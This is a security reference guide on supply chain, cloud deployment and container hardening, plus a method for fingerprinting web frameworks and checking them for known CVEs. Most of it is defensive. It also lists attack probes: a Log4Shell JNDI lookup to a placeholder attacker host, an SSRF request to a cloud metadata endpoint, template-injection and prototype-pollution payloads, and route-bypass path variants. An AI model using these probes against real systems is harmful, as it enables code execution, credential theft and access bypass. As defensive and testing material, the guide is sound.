# Web Deployment and Supply Chain Security

> **Source**: Derived from WooYun vulnerability database real-world experience + cloud security best practices + OWASP supply chain security guidelines
> **Methodology**: WooYun vulnerability root-cause formula + L1-L4 systematic analysis
> **Related**: AI application container escape testing → [ai-baseline-security.md](ai-baseline-security.md)

---

## 1. Supply Chain and Component Security

### 1.1 Root Cause of Vulnerability

```
Supply Chain Risk = Third-party Code Trust × Transitive Dependency Depth × Update Lag
```

70-90% of application code comes from open-source components; a single high-severity component vulnerability can affect tens of thousands of projects (e.g. Log4Shell, Polyfill.io).

### 1.2 Frontend Supply Chain

**npm/yarn Dependency Risks**

| Attack Type | Description | Typical Example |
|-------------|-------------|-----------------|
| Malicious package | Malicious package with similar name (typosquatting) | `crossenv` steals environment variables |
| Prototype pollution | `lodash`/`jQuery` prototype chain pollution | CVE-2019-10744 |
| Dependency hijacking | Backdoor planted after maintainer account takeover | `event-stream` cryptomining |
| CDN poisoning | Publicly-hosted CDN JavaScript tampered with | Polyfill.io supply chain attack |
| Build injection | package.json scripts hooks execute malicious commands | `postinstall` script attack |

**Detection Methods**

```bash
# Audit known vulnerabilities
npm audit
yarn audit

# Check outdated dependencies
npm outdated

# View dependency tree depth
npm ls --all | head -100

# Check suspicious install scripts
npm pack --dry-run  # View files to be installed
cat node_modules/<pkg>/package.json | grep -A5 '"scripts"'
```

### 1.3 Backend Supply Chain

**Python/pip**

```bash
# Known vulnerability audit
pip-audit
safety check

# View dependencies
pip list --outdated
pipdeptree  # Visualize dependency tree
```

**Java/Maven**

```bash
# OWASP Dependency-Check
mvn org.owasp:dependency-check-maven:check

# View dependency tree
mvn dependency:tree
```

**Quick Reference for Common High-Severity Component Vulnerabilities**

| Component | CVE | Impact | Detection |
|-----------|-----|--------|-----------|
| Log4j2 | CVE-2021-44228 | RCE | `${jndi:ldap://attacker/}` |
| Spring4Shell | CVE-2022-22965 | RCE | Spring Framework < 5.3.18 |
| FastJSON | CVE-2022-25845 | RCE | autoType deserialization |
| Apache Struts2 | CVE-2017-5638 | RCE | Content-Type injection |
| Jackson | CVE-2019-12384 | RCE | Polymorphic deserialization |
| Commons-Collections | CVE-2015-6420 | RCE | Java deserialization chain |
| jQuery | CVE-2020-11022 | XSS | < 3.5.0 HTML injection |
| Lodash | CVE-2021-23337 | RCE | Template injection |

### 1.4 Docker Image Supply Chain

```bash
# Image vulnerability scanning
trivy image <image:tag>
grype <image:tag>

# Check base image
docker inspect <image> | grep -i "rootfs\|created\|author"

# View image layer history (find hidden files/keys)
docker history --no-trunc <image>
```

**Risk Points**:
- Using `latest` tag instead of a pinned version
- Base image too large (contains unnecessary tools like gcc/curl)
- Hardcoded keys/credentials in Dockerfile
- Running containers as root user

### 1.5 Recommended SCA Tools

| Tool | Language/Use Case | Features |
|------|-------------------|----------|
| `npm audit` / `yarn audit` | JavaScript | Built-in, free |
| `pip-audit` / `safety` | Python | Free |
| OWASP Dependency-Check | Java/.NET | Open-source, multi-language support |
| Snyk | All languages | SaaS, most comprehensive vulnerability database |
| Trivy | Container/IaC/SBOM | Open-source, fast |
| Grype | Container images | Open-source, by Anchore |
| Renovate / Dependabot | Auto-upgrade | GitHub integration |

### 1.6 SBOM (Software Bill of Materials)

```bash
# Generate SBOM (CycloneDX format)
cyclonedx-npm --output sbom.json            # Node.js
cyclonedx-py --format json -o sbom.json      # Python
mvn org.cyclonedx:cyclonedx-maven-plugin:makeBom  # Java

# Generate SBOM (SPDX format)
syft <image> -o spdx-json > sbom.spdx.json   # Container image
```

SBOM uses: compliance auditing, license compliance, vulnerability tracking, supply chain transparency.

### 1.7 Defensive Measures

- **Pin versions**: Use `package-lock.json` / `Pipfile.lock` / `pom.xml` to fix dependency versions
- **Minimal dependencies**: Regularly clean unused dependencies, avoid transitive dependency bloat
- **CI integration**: Add SCA scanning to CI/CD, block builds on vulnerabilities
- **Private registry**: Use Nexus/Verdaccio proxy, avoid directly pulling from public registries
- **Signature verification**: npm supports `npm audit signatures` to verify package signatures
- **Regular updates**: Configure Dependabot/Renovate to automatically create upgrade PRs

---

## 2. Cloud Deployment and Server Security

### 2.1 Root Cause of Risk

```
Deployment Risk = Default Configuration Trust × Exposure Surface × Operational Negligence
```

Application code security does not equal system security. Misconfigured deployment environments are often the first entry point exploited by attackers.

### 2.2 Server Hardening Checklist

**Ports and Services**

```bash
# Scan open ports
nmap -sV -p- <target>

# Quick reference for high-risk ports
# 22(SSH) 3306(MySQL) 6379(Redis) 27017(MongoDB) 9200(Elasticsearch)
# 8080(Tomcat) 8443(admin) 2375(Docker API) 10250(Kubelet)
```

| Check Item | Secure Configuration | Risk |
|------------|----------------------|------|
| SSH | Disable root login, key-based auth, non-default port | Brute force |
| Database port | Bind only to 127.0.0.1/internal IP | Unauthorized access |
| Redis | Set password, disable external access, rename dangerous commands | RCE (write webshell/crontab/ssh key) |
| MongoDB | Enable authentication, bind to internal network | Data leakage |
| Docker API | Bind to Unix Socket, enable TLS | Container escape/RCE |
| Elasticsearch | X-Pack authentication, disable external access | Data leakage |
| Kubernetes API | RBAC, network policies, audit logs | Cluster takeover |

**Operating System Hardening**

```bash
# Linux hardening check
cat /etc/ssh/sshd_config | grep -E "PermitRootLogin|PasswordAuth|Port"
cat /etc/passwd | grep ':0:'          # Unauthorized root users
find / -perm -4000 2>/dev/null        # SUID files
crontab -l                            # Cron job backdoors
last -20                              # Recent login records
ss -tlnp                              # Listening ports
iptables -L -n                        # Firewall rules
```

### 2.3 TLS/SSL/HTTPS Configuration

**Testing Methods**

```bash
# SSL/TLS configuration check
nmap --script ssl-enum-ciphers -p 443 <target>
testssl.sh <target>
sslyze <target>

# Online check
# https://www.ssllabs.com/ssltest/
```

**Common Issues**

| Issue | Risk | Fix |
|-------|------|-----|
| TLS 1.0/1.1 not disabled | BEAST/POODLE attacks | Enable TLS 1.2+ only |
| Weak cipher suites (RC4/DES/MD5) | Downgrade attacks | Use AES-GCM/ChaCha20 |
| Expired/self-signed certificate | Man-in-the-middle attack | Use Let's Encrypt/CA certificate |
| Missing HSTS header | SSL Strip | `Strict-Transport-Security: max-age=31536000` |
| Mixed content (HTTP+HTTPS) | Content hijacking | Site-wide HTTPS + CSP |

**Nginx Secure Configuration Reference**

```nginx
server {
    listen 443 ssl http2;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
    ssl_prefer_server_ciphers on;
    
    # Security headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Content-Type-Options nosniff;
    add_header X-Frame-Options DENY;
    add_header X-XSS-Protection "1; mode=block";
    add_header Content-Security-Policy "default-src 'self'";
    add_header Referrer-Policy strict-origin-when-cross-origin;
    
    # Hide version
    server_tokens off;
    
    # Disable directory listing
    autoindex off;
}
```

### 2.4 Cloud Service Security

**General Cloud Risks (AWS/Azure/GCP/Alibaba Cloud)**

| Risk | Detection Method | Impact |
|------|-----------------|--------|
| S3/OSS bucket public | `aws s3 ls s3://bucket --no-sign-request` | Data leakage |
| IAM permissions too permissive | Check `*` wildcard policies | Privilege escalation |
| Security group open to all | Check `0.0.0.0/0` inbound rules | Exposing internal services |
| Hardcoded secrets | `trufflehog`/`gitleaks` scan code repositories | Account takeover |
| Metadata service | `curl http://169.254.169.254/` (SSRF exploitation) | Credential theft |
| Logging not enabled | CloudTrail/ActionTrail audit | Unable to trace incidents |

**PaaS Platform Risks (Railway/Vercel/Heroku/Netlify)**

| Risk | Description | Detection |
|------|-------------|-----------|
| Environment variable leakage | Build logs/error pages expose ENV variables | Check public build logs |
| Domain takeover | CNAME pointing to deleted PaaS application | `dig CNAME <domain>` to check dangling records |
| Shared runtime escape | Insufficient isolation between multi-tenant containers | Probe co-located services |
| Deployment credential leakage | API Token in plaintext in CI configuration | Review CI/CD configuration files |
| Function injection | Event injection in Serverless functions | Test event parameter controllability |

**Cloud Credential Leakage Detection**

```bash
# Code repository scanning
gitleaks detect --source=. --verbose
trufflehog git https://github.com/org/repo

# Common leak locations
.env / .env.production / .env.local
docker-compose.yml
CI configs: .github/workflows/*.yml / .gitlab-ci.yml / Jenkinsfile
Frontend code: next.config.js / .env.NEXT_PUBLIC_*
```

### 2.5 Container and Orchestration Security

> **AI Application Container Escape**: Container escape testing methodology for AI Agent/LLM deployment environments → [ai-baseline-security.md](ai-baseline-security.md) §20

**Docker Security Checks**

```bash
# Container runs as non-root
docker inspect <container> | grep '"User"'

# Check privileged mode
docker inspect <container> | grep '"Privileged"'

# Check mounts (sensitive directories)
docker inspect <container> | grep -A10 '"Mounts"'

# Check Capabilities
docker inspect <container> | grep -A20 '"CapAdd"'
```

**Kubernetes Security Checks**

```bash
# RBAC audit
kubectl auth can-i --list --as=system:serviceaccount:default:default
kubectl get clusterrolebinding -o wide

# Pod security
kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.securityContext}{"\n"}{end}'

# Secret plaintext check
kubectl get secrets -o yaml | grep -i "password\|token\|key"

# Network policies
kubectl get networkpolicy -A
```

### 2.6 CI/CD Pipeline Security

| Risk | Description | Defense |
|------|-------------|---------|
| Secrets stored in plaintext | Hardcoded secrets in pipeline configuration | Use Vault/Sealed Secrets |
| Untrusted dependencies | Pulling unverified build tools in CI | Pin CI image versions |
| Build injection | Modifying CI configuration in PRs to execute malicious code | Fork PRs require approval before triggering CI |
| Artifact tampering | Build artifacts not signed | Cosign/Notary signing |
| Overly permissive | CI Token has admin permissions | Least-privilege Token |

### 2.7 Deployment Security Checklist

**Server**
- [ ] SSH key-based login, disable password and root
- [ ] Firewall opens only necessary ports (80/443)
- [ ] Database/cache listens only on internal network
- [ ] Regularly update OS and middleware patches
- [ ] Enable audit logs and intrusion detection

**HTTPS**
- [ ] TLS 1.2+ and disable weak cipher suites
- [ ] HSTS header + CAA record
- [ ] Automatic certificate renewal (Let's Encrypt)

**Cloud Services**
- [ ] IAM least privilege + MFA
- [ ] Storage bucket private + encrypted
- [ ] Security group restricts source IP
- [ ] CloudTrail/audit logging enabled
- [ ] Secrets managed via KMS/Vault, not hardcoded

**Container**
- [ ] Run as non-root user
- [ ] Read-only filesystem
- [ ] No privileged mode + minimal Capabilities
- [ ] Image scanning (Trivy/Grype)
- [ ] Network policies isolate inter-Pod communication

**CI/CD**
- [ ] Secrets managed via secret management system, not in configuration files
- [ ] SCA scanning integrated into build pipeline
- [ ] Artifact signature verification
- [ ] Fork PR requires approval before triggering build

---

## 3. General Web Framework CVE Detection Methodology

> Applicable to any web framework including Next.js, Spring Boot, Django, Rails, Express, Laravel for known CVE detection and exploitation verification

### 3.1 Framework Fingerprinting

**Automated Fingerprint Collection**

| Fingerprint Source | Detection Method | Information Extracted |
|-------------------|-----------------|----------------------|
| HTTP response headers | Check `X-Powered-By`, `Server`, `X-Framework` | Framework name and version |
| Cookie names | `JSESSIONID` (Java), `laravel_session` (Laravel), `_next` (Next.js) | Framework type |
| Default error pages | Trigger 404/500, analyze page characteristics, style, text | Framework + debug mode |
| Static resource paths | `/_next/` (Next.js), `/static/` (Django), `/assets/` (Rails) | Framework + build tool |
| JS file content | Search for `webpack`/`vite`/`turbopack` identifiers, framework version strings | Exact version number |
| Source Map | Access `*.js.map` to check for leakage, analyze import paths | Framework + complete dependency list |
| Meta tags/comments | `<meta name="generator">` tags in HTML, build comments | Framework version |
| package.json leakage | Access `/package.json`, `/composer.json`, `/Gemfile.lock` | All dependencies and exact versions |

```
Fingerprint Identification Process:
1. Passive collection → Response headers, Cookie, HTML, JS analysis
2. Active probing → Default paths, error triggering, configuration file access
3. Version pinpointing → Precise to major.minor.patch version
4. CVE matching → NVD/Snyk/GitHub Advisory lookup
```

### 3.2 CVE Lookup and PoC Verification

**CVE Data Sources**

| Data Source | URL | Features |
|------------|-----|----------|
| NVD | nvd.nist.gov | Official CVE database, CVSS scoring |
| GitHub Advisory | github.com/advisories | Open-source project vulnerabilities, includes PoC links |
| Snyk | snyk.io/vuln | Dependency-level precise matching |
| Exploit-DB | exploit-db.com | Verified PoC and exploits |
| PacketStorm | packetstormsecurity.com | Security advisories and exploit code |
| Framework ChangeLog | Framework official Release Notes | Security fix details |

**General CVE Verification Process**

```
1. Version Comparison
   Confirm version number → Check CVE affected range (affected versions) → Confirm whether in affected range

2. PoC Reproduction
   a. Search for public PoC (GitHub/Exploit-DB/security blogs)
   b. Understand the vulnerability mechanism (patch diff is the best reference)
   c. Construct requests in test environment to verify
   d. Note: In production environments, only verify trigger conditions, do not execute destructive payloads

3. Patch Analysis (L4 Defense Back-engineering)
   a. Compare code diff before and after fix → Understand what was fixed
   b. Back-engineer: identify what defect existed in the pre-fix processing logic
   c. Consider: Is the fix complete? Is there a possibility of bypassing the fix?
```

### 3.3 Common Framework Attack Surface Classification

| Attack Surface Type | General Detection Method | Typical Vulnerability Pattern |
|--------------------|------------------------|-------------------------------|
| **Route/Middleware Bypass** | Path normalization testing: `//path`, `/./path`, `/%2e/path`, case variants, special request header spoofing | Authentication bypass, authorization skip |
| **Template/Rendering Injection** | Inject template syntax into parameters: `{{7*7}}` (Jinja2), `${7*7}` (Thymeleaf), `<%= 7*7 %>` (ERB) | SSTI→RCE |
| **Deserialization** | Identify serialization format (`ac ed 00 05`/`O:`/`rO0AB`), send malicious serialized data | Java/PHP/Python deserialization RCE |
| **Server Actions/RPC** | Intercept framework-specific RPC calls, analyze endpoint identifiers, directly call to bypass frontend validation | CSRF, input validation bypass |
| **SSR/RSC Injection** | Intercept and modify server-side rendering parameters (e.g. `_rsc`/`__data`/`loader`), construct anomalous payload | Server-side code execution |
| **Configuration File Leakage** | Enumerate common configuration paths: `.env`, `web.config`, `application.yml`, `settings.py` | Key/credential leakage |
| **Debug Endpoints** | Check framework debug mode: `/debug`, `/_debug`, `/__inspect`, `/graphql` (introspection) | Information leakage→RCE |
| **Prototype Pollution (JS)** | Inject into JSON request body: `{"__proto__":{"isAdmin":true}}` or `{"constructor":{"prototype":{"x":1}}}` | Privilege escalation, DoS |
| **Cache Poisoning** | Manipulate cache key related headers (`X-Forwarded-Host`/`X-Original-URL`), verify whether response is cached | Stored XSS, phishing |

### 3.4 General Framework Security Checklist

```
[ ] Confirm exact versions of framework and all dependencies
[ ] Query NVD/Snyk/GitHub Advisory for corresponding CVEs
[ ] Verify all high-severity CVEs (CVSS>=7.0) have been patched
[ ] Whether Source Maps have been disabled
[ ] Whether debug mode has been disabled
[ ] Whether error pages leak stack traces/paths/versions
[ ] Whether default configuration file paths are accessible
[ ] Whether middleware/route authorization can be bypassed via path variants
[ ] Whether all API endpoints require authentication (test by removing Cookie/Token)
[ ] Whether security response headers are complete (CSP/HSTS/X-Frame-Options/X-Content-Type-Options)
[ ] Whether CSRF protection covers all state-changing operations
[ ] Whether framework-specific RPC/Action endpoints have independent authorization
```

---

*Derived from WooYun vulnerability database (88,636 entries) + cloud/supply chain security best practices | For security research and defensive reference only*
